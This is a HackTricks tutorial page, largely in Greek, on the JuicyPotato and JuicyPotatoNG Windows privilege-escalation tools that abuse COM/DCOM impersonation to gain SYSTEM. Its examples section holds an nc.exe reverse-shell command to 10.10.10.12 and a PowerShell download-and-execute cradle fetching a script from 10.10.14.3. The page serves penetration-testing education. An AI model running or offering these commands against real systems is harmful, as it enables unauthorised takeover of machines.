# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato είναι legacy. Γενικά λειτουργεί σε Windows εκδόσεις μέχρι τα Windows 10 1803 / Windows Server 2016. Αλλαγές της Microsoft που κυκλοφόρησαν αρχίζοντας από τα Windows 10 1809 / Server 2019 έσπασαν την αρχική τεχνική. Για αυτές τις builds και νεότερες, εξετάστε σύγχρονες εναλλακτικές όπως PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato και άλλες. Δείτε τη σελίδα παρακάτω για ενημερωμένες επιλογές και χρήση.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (κατάχρηση των golden προνομίων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια γλυκαντική έκδοση του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγη έξτρα λειτουργικότητα, δηλαδή_ **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Σύντομες σημειώσεις συμβατότητας

- Λειτουργεί αξιόπιστα έως τα Windows 10 1803 και Windows Server 2016 όταν το τρέχον context έχει SeImpersonatePrivilege ή SeAssignPrimaryTokenPrivilege.
- Έχει σπάσει από το Microsoft hardening στα Windows 10 1809 / Windows Server 2019 και νεότερα. Προτιμήστε τις εναλλακτικές που συνδέονται παραπάνω για αυτές τις εκδόσεις.

### Περίληψη <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Αποφασίσαμε να οπλοποιήσουμε τον [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Γνωρίστε το Juicy Potato**.

> Για τη θεωρία, δείτε [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε την αλυσίδα συνδέσμων και αναφορών.

Ανακαλύψαμε ότι, πέρα από την `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχραστούμε. Απλώς πρέπει να:

1. να μπορούν να δημιουργηθούν από τον τρέχοντα χρήστη, συνήθως έναν “service user” που έχει impersonation privileges
2. να υλοποιούν το interface `IMarshal`
3. να τρέχουν ως elevated user (SYSTEM, Administrator, …)

Μετά από δοκιμές, συλλέξαμε και δοκιμάσαμε μια εκτενή λίστα από [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) σε διάφορες εκδόσεις των Windows.

### Λεπτομέρειες <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato σας επιτρέπει να:

- **Target CLSID** _επιλέξτε οποιοδήποτε CLSID θέλετε._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _θα βρείτε τη λίστα οργανωμένη ανά OS._
- **COM Listening port** _ορίστε την προτιμώμενη θύρα COM listening (αντί για το marshalled hardcoded `6666`)_
- **COM Listening IP address** _bind τον server σε οποιαδήποτε IP_
- **Process creation mode** _ανάλογα με τα privileges του impersonated χρήστη μπορείτε να επιλέξετε από:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _εκκινήστε ένα εκτελέσιμο ή script αν η εκμετάλλευση πετύχει_
- **Process Argument** _προσαρμόστε τα arguments της εκκινούμενης διαδικασίας_
- **RPC Server address** _για μια πιο stealthy προσέγγιση μπορείτε να αυθεντικοποιηθείτε σε έναν εξωτερικό RPC server_
- **RPC Server port** _χρήσιμο αν θέλετε να αυθεντικοποιηθείτε σε εξωτερικό server και το firewall μπλοκάρει την πόρτα `135`…_
- **TEST mode** _κυρίως για δοκιμές, π.χ. δοκιμή CLSIDs. Δημιουργεί το DCOM και εκτυπώνει τον χρήστη του token. Δείτε_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Χρήση <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Αν ο χρήστης έχει `SeImpersonate` ή `SeAssignPrimaryToken` προνόμια τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτραπεί η κατάχρηση όλων αυτών των COM Servers. Μπορείτε να σκεφτείτε την τροποποίηση των δικαιωμάτων αυτών των αντικειμένων μέσω του `DCOMCNFG`, αλλά καλή τύχη — αυτό θα είναι δύσκολο.

Η πραγματική λύση είναι να προστατευτούν ευαίσθητοι λογαριασμοί και εφαρμογές που τρέχουν κάτω από τους λογαριασμούς `* SERVICE`. Η απενεργοποίηση του `DCOM` θα εμπόδιζε σίγουρα αυτό το exploit αλλά μπορεί να έχει σοβαρό αντίκτυπο στο υποκείμενο OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG επανεισάγει ένα JuicyPotato-style local privilege escalation σε σύγχρονα Windows συνδυάζοντας:
- DCOM OXID resolution σε τοπικό RPC server σε επιλεγμένη θύρα, αποφεύγοντας τον παλαιό σκληροκωδικοποιημένο listener 127.0.0.1:6666.
- Ένα SSPI hook για να καταγράψει και να προσωποποιήσει την εισερχόμενη πιστοποίηση SYSTEM χωρίς να απαιτεί RpcImpersonateClient, κάτι που επίσης επιτρέπει CreateProcessAsUser όταν υπάρχει μόνο το SeAssignPrimaryTokenPrivilege.
- Τρικ για να ικανοποιήσουν τους περιορισμούς ενεργοποίησης DCOM (π.χ. η πρώην απαίτηση INTERACTIVE-group όταν στοχεύονται οι κλάσεις PrintNotify / ActiveX Installer Service).

Σημαντικές σημειώσεις (εξελισσόμενη συμπεριφορά ανά builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
If you’re targeting Windows 10 1809 / Server 2019 where classic JuicyPotato is patched, prefer the alternatives linked at the top (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG may be situational depending on build and service state.

## Παραδείγματα

Σημείωση: Επισκεφτείτε [this page](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με CLSIDs που μπορείτε να δοκιμάσετε.

### Αποκτήστε ένα nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell αντίστροφο
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκινήστε ένα νέο CMD (αν έχετε πρόσβαση RDP)

![](<../../images/image (300).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και το exploit αποτυγχάνει. Συνήθως χρειάζονται πολλαπλές προσπάθειες για να βρείτε ένα **λειτουργικό CLSID**. Για να πάρετε μια λίστα CLSIDs για ένα συγκεκριμένο λειτουργικό σύστημα, επισκεφτείτε αυτήν τη σελίδα:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Έλεγχος CLSIDs**

Πρώτα, θα χρειαστείτε μερικά εκτελέσιμα αρχεία εκτός από το juicypotato.exe.

Κατεβάστε [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS σας, και κατεβάστε και εκτελέστε [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το script θα δημιουργήσει μια λίστα πιθανών CLSIDs για δοκιμή.

Στη συνέχεια, κατεβάστε [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(αλλάξτε τη διαδρομή προς τη λίστα CLSID και προς το εκτελέσιμο του juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID, και **όταν αλλάξει ο αριθμός θύρας, αυτό θα σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα λειτουργικά CLSIDs **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
